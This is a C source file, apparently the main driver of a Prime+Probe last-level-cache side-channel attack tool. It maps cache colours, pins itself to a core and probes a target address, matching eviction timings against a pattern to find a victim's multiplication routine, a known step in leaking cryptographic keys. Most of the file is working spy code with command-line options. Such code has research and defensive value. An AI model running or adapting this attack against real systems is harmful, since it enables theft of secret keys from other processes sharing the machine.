#define _POSIX_C_SOURCE 199309
#define _GNU_SOURCE
#include <sched.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <strings.h>
#include <string.h>
#include <errno.h>

#include "pageset.h"
#include "cpuid.h"
#include "cachemap.h"
#include "probe.h"
#include "comm.h"
#include "clock.h"
#include "analyse.h"

int PROBECOUNT = 10000;
#define PROBEWARMUP 50
// int SLOT = 5000;
int SLOT = 5000;


char chars[] = " .,:;-+*@@@@@@@@@@@@@@@@@@@";


int debug_printcachemap = 0;
int findcachemap = 0;

void printcachemap(pageset_t *pms, int colours) {
  for (int i = 0; i < colours; i++) {
    printf("%3d:", i);
    for (int j = 0; j < ps_size(pms[i]); j++)
      printf(" %4d", ps_get(pms[i], j));
    printf("\n");
  }
}

/* cachemap will generate a pageset for each colour within the 2*L3_size buffer, but the primelists only contains exactly assoc cache lines. */

listEntry_t *genPrimeLists(pageset_t *pms, int colours, long probeAddress) 
{
  int assoc = cpuid_l3assoc();

  listEntry_t *primeLists =  malloc(sizeof(listEntry_t) * colours);
  pageset_t ps = ps_new();

    /*in each coloured pageset, linking the cachelines that collide with the target address*/
    /* link all the conflicting cache lines for each other, which specific cache line to link is determined by probeAddress (determine the offset within the page) */

  for (int i = colours; i--; ) {
    for (int j = assoc; j--; )
      ps_push(ps, ps_get(pms[i], j));
    primeLists[i] = probe_makelist(ps, (void *)probeAddress);
    ps_clear(ps);
  }

  ps_delete(ps);
  return primeLists;
}

listEntry_t genPrimeList(pageset_t ops, long probeAddress) 
{
  static pageset_t ps = NULL;
  int assoc = cpuid_l3assoc();

  if (ps == NULL) 
    ps = ps_new();

  for (int j = assoc; j--; )
    ps_push(ps, ps_get(ops, j));
  listEntry_t rv = probe_makelist(ps, (void *)probeAddress);
  ps_clear(ps);
  return rv;
}


listEntry_t *genProbeLists(listEntry_t *primeLists, int colours)
{
  listEntry_t *probeLists =  malloc(sizeof(listEntry_t) * colours);
    
    /*For each coloured pageset, traversing toward the other end of the prime list, as probe list*/
  for (int i = colours; i--; )
    probeLists[i] = doPrime(primeLists[i]);
  return probeLists;
}

void doProbes(listEntry_t primeList, listEntry_t probeList, char *buf, int count, int warmup, int slot) 
{
    
    /*sequence: probe, prime, prime, delay for N cycles*/
    
    for (int i = -warmup; i < count; i++) 
    {
        uint32_t slotstart = gettime();
        /*question: does the number has too be smaller than a char? */
	/* answer: probe_timelist returns the number of ways that were brought in from memory.  On Intel the maximum value is 16 */
        char t = probe_timelist(probeList);
        if (i >= 0)
            buf[i] = t;
        prime(primeList);
        prime(primeList);
        delay(slotstart, SLOT);
    }
}

/*output:
   '.' - none probed
   '-' - Probed multiplication routine only
   '+' - probed scanned line only
   '@' - probed both lines.*/
void probeMulti(listEntry_t primeList, listEntry_t probeList, listEntry_t multPrime, listEntry_t multProbe, char *buf, int count, int warmup, int slot) {
    static char *chr = ".+-@";
    int inMult = 0;
    
    /*sequence: for target prime list, probe, prime, prime, 
     then one more iteration for the testing list*/
    
    for (int i = -warmup; i < count; i++) {
        uint32_t slot = gettime();
        char tm = probe_timelist(multProbe) != 0;
        prime(multPrime);
        prime(multPrime);
        
        char t = probe_timelist(probeList) != 0;
        prime(primeList);
        prime(primeList);
        
        if (i>=0)
            buf[i] = chr[((tm) << 1) | (t|inMult)];
        inMult = t;
        delay(slot, SLOT);
    }
}


void usage(char *p) {
  fprintf(stderr, "Usage: %s -a address [-m] [-q] [-p pattern] [-o outputfile] [-s slotsize] [-c probecount] [-f offsets] -n [multipliersscans]\n", p);
  exit(1);
}

/*
 * -a address
 * -c probecount
 * -p pattern
 * -o output file
 * -q quick terminate
 * -s slot size
 * -m look for multipliers
 * -n number of scans for multipliers
 * -f Multipliers offsets
 */

int main(int c, char **v) {
  int ch;
  int mulComponents = 0;
  char *outname = NULL;
  FILE *out=stdout;
  long probeAddress = 0;
  char *pattern = NULL;
  int quick = 0;
  int offsets[64];
  int noffsets = 64;
  int mulscans = 8;
 
  cpu_set_t mask;

  for (int i=0; i < 64; i++)
    offsets[i] = 64 * i;

  while ((ch = getopt(c, v, "n:f:a:c:p:o:qs:m")) != -1) {
    switch(ch) {
      case 'a': probeAddress = strtol(optarg, NULL, 0); break;
      case 'c': PROBECOUNT = strtol(optarg, NULL, 0); break;
      case 'p': pattern = optarg; break;
      case 'o': outname = optarg; break;
      case 'q': quick = 1; break;
      case 's': SLOT = strtol(optarg, NULL, 0); break;
      case 'm': mulComponents = quick = 1; break;
      case 'n': mulscans = strtol(optarg, NULL, 0); break;
      case 'f': {
	  char *tok;
	  noffsets = 0;
	  while ((tok = strsep(&optarg, ",")) != NULL) {
	    //optarg = NULL;
	    offsets[noffsets++] = strtol(tok, NULL, 16) ;
	    if (noffsets == sizeof(offsets)/sizeof(offsets[0]))
	      break;
	  }
	}
	break;
      case '?':
      default: usage(*v);
    }
  }

  if (probeAddress == 0) {
    fprintf(stderr, "Probe address not set\n");
    usage(*v);
  }

  if (mulComponents && (pattern == NULL)) {
    fprintf(stderr, "Must have a multiply pattern for searching multiply components\n");
    usage(*v);
  }

  /* pin the process to core 2 */

  CPU_ZERO(&mask);
  CPU_SET(2, &mask);

  while(sched_setaffinity(0, sizeof(cpu_set_t), &mask)<0)
     perror("sched_setaffinity"); 

  probe_init(NULL, 0);
  srandom(getpid());

  int colours = cpuid_l3colours();
  fprintf(stderr, "my colours = %d\n", colours);

    /*seperate the probing buffer into coloured pagesets*/
  pageset_t *pms = cachemap();
  //if (debug_printcachemap)
  for(int i = 0; i < colours; i++)
	printf("colour %d: %p\n", i, pms[i]);
   printcachemap(pms, colours);

  if (findcachemap){
     exit(0);
  }

    /*For each coloured pageset, generating prime and probe lists*/
  listEntry_t *primeLists =  genPrimeLists(pms, colours, probeAddress);
  listEntry_t *probeLists =  genProbeLists(primeLists, colours);

  /* Warmup */
  for (int i = 0; i < 100; i++) {
    for (int c = 0; c < colours; c++) {
      probe_timelist(probeLists[c]);
      prime(primeLists[c]);
    }
  }

  printf("Process id: %d\n", getpid());
  sleep(30);
  printf("Starting\n");


    unsigned long time = gettime();
    
    if (outname != NULL)
      out = fopen(outname, "w");
    
    // start Probe
    /*using a small array, avoiding cache footprints? */
    /* Using smaller elements reduces the chance of using conflicting lines at the cost of a larger interference
     * when a conflict arrises.  */
    char l[PROBECOUNT];
    int mulcolour = -1;
    
    /*question: why colour * 40, generating randomizd probing sequence? */
    /* Answer: Just to make sure we have enough probes.  With recent changes we need less than 40. */
    for (int c = 0; c < colours * 40; c++) {
      
      /*probe + prime on coloured lists, and print the number of evicted cache lines*/
      doProbes(primeLists[c% colours], probeLists[c% colours], l, PROBECOUNT, PROBEWARMUP, SLOT);
      
      fprintf(out, "%3d ", c%colours);
      for (int i = 0; i < PROBECOUNT; i++)
	  fputc(l[i] + (l[i] < 10 ? '0' : ('a'-10)), out);
      fputc('\n', out);
      
      if (pattern != NULL) {
        /*comparing the probing pattern with the target pattern, number of evicted cache lines in
         the probe list*/
          int score = match(l, PROBECOUNT, pattern);
          if (score * 10000 > 300 * PROBECOUNT) {
              printf("line %d(%d)  score %d\n", c+1, c% colours, score);
              
              if (quick) {
                  /*confirming the pattern by having 10 more iterations*/
                  int x = 0;
                  for (int i = 0; i < 10; i++) {
                      doProbes(primeLists[c% colours], probeLists[c% colours], l, PROBECOUNT, PROBEWARMUP, SLOT);
                      if (match(l, PROBECOUNT, pattern) * 10000 >300 * PROBECOUNT) {
                          x++;
                          printf("Round %d passed\n", i);
                      } else {
                          printf("Round %d failed\n", i);
                      }
                  }
                  if (x > 5)  {
                      mulcolour = c % colours;
                      break;
                  }
              }
          }
      }
    }
    if (!quick)
        exit(0);
    if (!mulComponents)
        exit(0);
    if (mulcolour < 0)
        exit(1);
    
    fprintf(out, "-------------------------------\n");
    /*scans the whole cache, probing both the multiplication cache line and the scanned line*/
    for (int c = 0; c < colours * mulscans ; c++) {
        if (c%colours == mulcolour)
            continue;
	for (int i = 0; i < noffsets; i++) {
	    int p = offsets[i];
            listEntry_t primeList = genPrimeList(pms[c%colours], p);
            listEntry_t probeList = doPrime(primeList);
            probeMulti(primeList, probeList, primeLists[mulcolour], probeLists[mulcolour], l,PROBECOUNT, PROBEWARMUP, SLOT);
            fprintf(out, "%3d.%03x ", c%colours, p%PAGE_SIZE);
            for (int i = 0; i < PROBECOUNT; i++)
                fputc(l[i], out);
            fputc('\n', out);
        }
        printf("Done line %d\n",c % colours);
        sleep(2);
    }
    
}
